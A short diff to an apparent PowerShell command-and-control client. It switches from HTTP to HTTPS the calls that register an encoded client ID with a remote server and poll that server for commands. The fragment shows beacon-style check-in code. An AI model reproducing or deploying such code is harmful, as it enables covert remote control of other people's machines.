@@ -81,7 +81,7 @@ function Invoke-InitialConnection {
         $base64_id = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:id))
 
         try {
-            $req = Invoke-WebRequest -Uri "http://$global:ip_port/api/client/$base64_id" -Method POST -Body $jsonData -ContentType "application/json" -UseBasicParsing -ErrorAction Stop
+            $req = Invoke-WebRequest -Uri "https://$global:ip_port/api/client/$base64_id" -Method POST -Body $jsonData -ContentType "application/json" -UseBasicParsing -ErrorAction Stop
 
             if ($req.StatusCode -eq 200) {
                 $went_through = $true
@@ -114,7 +114,7 @@ function Invoke-CheckForCommands {
     $base64_id = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:id))
     
     try {
-        $req = Invoke-WebRequest -Uri "http://$global:ip_port/api/client/$base64_id" -Method GET -UseBasicParsing -ErrorAction Stop
+        $req = Invoke-WebRequest -Uri "https://$global:ip_port/api/client/$base64_id" -Method GET -UseBasicParsing -ErrorAction Stop
         
         if ($req.StatusCode -eq 200) {
             $outData = $req.Content | ConvertFrom-Json
